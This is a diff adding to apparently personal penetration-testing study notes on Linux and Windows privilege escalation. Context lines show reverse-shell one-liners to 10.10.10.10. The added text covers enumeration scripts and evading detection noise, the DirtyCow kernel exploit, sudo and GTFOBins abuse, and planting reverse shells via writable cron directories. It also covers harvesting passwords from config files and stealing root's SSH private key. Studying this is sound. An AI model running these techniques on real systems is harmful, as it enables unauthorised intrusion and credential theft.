@@ -411,3 +411,62 @@ $bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 -Powershell
 $powershell -nop -c "$client = New -O
+
+
+\\\\Privileged escalation
+-cheat sheet: https://book.hacktricks.wiki/en/index.html
+- check list for both lĩnux and Window local privileged https://github.com/swisskyrepo/PayloadsAllTheThings
+\\enumeration script
+-common linux enum scripts include LinEnum and linuxprivchecker,
+- common window include Seatbelt and JAWS
+- another useful tool for server enumeration is Privilege Escalation Awesome Script SUITE (PEASS), as it is well maintained to remain
+up to date and includes scripts for enumerating both linux and windows
+NOTE: these script will run many commands known for identifying vuls and create a lot of "noise" that may trigger anti-virus soft or security monitoring soft
+that look for these types of events. this may prevent the script from rnning or even trigger an alarm that the system has been compromissed. in some instance, 
+we may want to do a manual enum instead o running scripts
+-EX: of running the linux scripts from PEASS called LinPEAS
+$./linpeas.sh
+-> the script collecting infor and display it and report
+\\Kernal exploits
+when ever OS old -> looking for potential kernel vul
+EX: we found linu kernel 3.9.0-73-generic  -> msf6 console -> searchsploit 3.9.0-73-generic -> we will find CVE-2016-5195 otherwise known as DirtyCow
+search for and download the DirtyCow exploit and run it on the server to gain root access
+=> tesst on lab and get approval with explicit, coordination 
+\\Vulnerable Software
+check installed software EX: $ dpkg -l command on linux or look at C:\Program Files 
+searchsploit for exploiting identified
+\\User Privileges
+-in somecase we may able to escalate our privileges to root/system users or gain access as diff user. below are some common ways to exploit certain user privileges
++sudo    +SUID		+Windows Token Privileges
+-The sudo command in Linux allows a user to execute commands as a diff user. it is usually used to allow lower privileged users to execute commands
+as root without giving them access to the root user.
+-this is generally done as specific commands can only be run as root like $tcpdump or allow the user to access certain root-only dir. we can check what sudo privileges we have
+$sudo -l  -> $sudo su -l -> check for password properties -> $sudo -u user /bin/echo hello world
+- once we find a specific app run with sudo, we can look for ways to exploit itto get a shell as the root user.
+-GTFOBins https://gtfobins.github.io/ contains a list of commands and how they can be exploited through sudo, search for app we have sudo privileged over.
+-> it may tell us the exact command we should execute to gain root access using the sudo privileges we have
+- LOLBAS https://lolbas-project.github.io/# also contains a list of window app which we may be able to leverage to perform certain function like downloading fils or executing command in the context of a pri user
+\\Scheduled Task
+methods to have script run at specific intervals to carry out a task. Scheduled task (windows) or cron jobs (linux) to escalate our privileged
+1. add new scheduled task/cron jobs
+2. Trick them to execute a malicious software
+-the easiest way to check if we are allowed  to add new scheduled tasks -> there are specific dir tat we may be able to utilize to add new cronjobs if we have the write permissions over them
+1. /etc/crontab
+2. /etc/cron.d
+3. /var/spool/cron/crontabs/root
+<> if we can write to a dir called b a cron job -> we can write a bash script with a reverse shell command, which should send us a reverse shell when executed
+\\Exposed credentials
+look fr any exposed credentials. thiss is very common with configuration files, log files, and user history files (bash_history in linux and PSReadLine in Windows)
+...SNIP...
+[+] Searching passwords in config PHP files
+[+] Finding passwords inside logs (limit 70)
+...SNIP...
+/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
+-> check for reuse password
+\\SSH Keys
+<>if we have read access over te .ssh dir for specific user -> read their private ssh key found in /home/user/.ssh/id_rsa or /roo/.ssh/id_rsa
+-> use it to login to the server. 
+<> if we can read /root/.ssh/ dir and can read the id_rsa file, we can copy it to our machine and use the -i flag to lo in with it:
+$vim id_rsa
+$chmod 600 id_rsa
+$ssh root@10.10.10.10 -i id_rsa
